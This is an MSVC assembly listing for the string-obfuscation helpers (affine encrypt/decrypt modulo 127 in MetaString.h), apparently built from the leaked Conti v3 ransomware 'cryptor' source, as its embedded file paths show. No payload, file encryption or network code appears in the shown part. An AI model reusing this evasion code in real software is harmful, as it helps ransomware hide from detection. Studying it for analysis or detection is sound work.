  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 28	 add	 eax, 40			; 00000028H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 6f	 sub	 eax, 111		; 0000006fH
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6f	 add	 r8d, 111		; 0000006fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 58	 sub	 eax, 88			; 00000058H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 58	 add	 r8d, 88			; 00000058H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 09	 sub	 eax, 9
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 09	 add	 r8d, 9
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 54 00 00 00	 mov	 ecx, 84			; 00000054H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 54	 add	 r8d, 84			; 00000054H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 13 00 00 00	 mov	 ecx, 19
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

